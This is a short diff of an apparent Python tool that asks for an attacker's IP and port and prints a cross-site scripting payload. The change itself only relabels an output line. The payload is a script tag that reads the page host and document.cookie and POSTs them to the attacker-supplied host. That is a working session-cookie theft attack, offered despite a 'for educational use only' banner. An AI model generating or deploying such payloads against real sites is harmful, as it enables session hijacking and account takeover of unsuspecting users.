@@ -13,7 +13,7 @@ print("calfcrusher@inventati.org | For educational use only.\n")
 IP = input("Enter IP: ")
 PORT = input("Enter port: ")
 
-print("\n*** Copy and launch ***\n")
+print("\n*** XSS payload ***\n")
 payload = "<script>var xmlhttp = new XMLHttpRequest(); xmlhttp.open(\"POST\", \"http://" + IP + ":" + PORT + "/\", true); xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie}));</script>"
 print(payload)
 print("\n")
